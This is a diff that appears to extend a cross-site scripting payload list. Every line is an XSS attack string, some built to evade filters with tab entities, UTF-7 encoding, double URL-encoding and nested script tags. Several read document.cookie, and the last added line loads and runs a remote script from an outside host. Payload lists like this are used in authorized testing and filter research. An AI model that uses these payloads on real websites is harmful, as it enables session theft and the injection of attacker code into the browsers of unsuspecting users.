@@ -12,6 +12,8 @@ x"//oNeRrOr=`/AmoloHT/`
 <svg><set onbegin=d=document,b='`',d['loca'+'tion']='javascript&colon;aler'+'t'+b+domain+b>
 <svg><set onbegin=d=document,b=/`/.source,d[/loca/.source+/tion/.source]=/javascript&colon;aler/.source+/t/.source+b+domain+b>
 `/alert?.(1)'"><Svg/OnLoad='`
+<iframe src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>
+<var onmouseover="prompt(1)">On Mouse Over</var>
 <a/href="/alert(1)/">
 <a href=//X55.is autofocus onfocus=import(href)>
 <a href=javascript:'\74svg/onload\75alert\501\51\76'>
@@ -39,3 +41,14 @@ JavaScript://%250Aalert?.(1)//
 function/**/Date(){alert(1)}
 function/**/RegExp(){alert(1)}
 /*-/*`/*\`/*'/*"/**/(/**/oNclick=alert())//%0D%0A%0D%0a//</style/</title/</textarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
++ADw-script+AD4-alert(document.location)+ADw-/script+AD4-
+%2BADw-script+AD4-alert(document.location)%2BADw-/script%2BAD4-
++ACIAPgA8-script+AD4-alert(document.location)+ADw-/script+AD4APAAi-
+%2BACIAPgA8-script%2BAD4-alert%28document.location%29%2BADw-%2Fscript%2BAD4APAAi-
+%253cscript%253ealert(document.cookie)%253c/script%253e
+“><s”%2b”cript>alert(document.cookie)</script>
+“><ScRiPt>alert(document.cookie)</script>
+“><<script>alert(document.cookie);//<</script>
+foo<script>alert(document.cookie)</script>
+<scr<script>ipt>alert(document.cookie)</scr</script>ipt>
+%22/%3E%3CBODY%20onload=’document.write(%22%3Cs%22%2b%22cript%20src=http://my.box.com/xss.js%3E%3C/script%3E%22)’%3E
